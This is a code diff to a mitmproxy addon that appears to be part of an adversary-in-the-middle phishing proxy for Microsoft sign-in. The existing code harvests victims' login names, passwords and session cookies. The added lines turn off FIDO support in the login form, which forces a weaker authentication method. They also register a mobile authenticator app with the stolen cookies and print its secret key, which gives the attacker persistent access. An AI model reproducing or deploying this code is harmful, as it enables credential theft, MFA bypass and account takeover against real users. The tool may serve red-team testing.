@@ -12,6 +12,7 @@ from mitmproxy.http import HTTPFlow
 
 from .aitm_config import config
 from .helpers import cookies, requests, responses
+from .msft_aama import register_mobile_app
 
 logger = logging.getLogger(__name__)
 
@@ -38,6 +39,8 @@ class ModifierAddon:
             flow (mitmproxy.http.HTTPFlow): The HTTP flow object representing
                                             the client request and server response.
         """
+        if flow.request.host == config.local_upstream_hostname:
+            return
         requests.modify_header(flow, "Host")
         requests.modify_header(flow, "Referer")
         requests.modify_header(flow, "Origin")
@@ -49,6 +52,7 @@ class ModifierAddon:
         if flow.request.path.startswith("/common/login"):
             self.credentials["login"] = flow.request.urlencoded_form["login"]
             self.credentials["passwd"] = flow.request.urlencoded_form["passwd"]
+            flow.request.urlencoded_form["IsFidoSupported"] = "0"
 
     def response(self, flow: HTTPFlow) -> None:
         """
@@ -63,11 +67,19 @@ class ModifierAddon:
             flow (mitmproxy.http.HTTPFlow): The HTTP flow object representing
                                             the client request and server response.
         """
-        responses.modify_header(flow, "Location")
+
         responses.save_cookies(flow, self.simple_cookie)
+        responses.modify_header(flow, "Location")
         responses.modify_cookies(flow)
         responses.modify_content(flow)
 
-        if flow.request.path in config.auth_url:
-            print(json.dumps(cookies.parse_cookies(self.simple_cookie)))
+        if flow.request.path in config.auth_url and flow.request.host != config.local_upstream_hostname:
+            parsed_cookies = cookies.parse_cookies(self.simple_cookie)
+            try:
+                secret_key = register_mobile_app(parsed_cookies, flow.request.headers["User-Agent"])
+                print(secret_key)
+            except AssertionError:
+                pass
+
+            print(json.dumps(parsed_cookies))
             print(self.credentials)
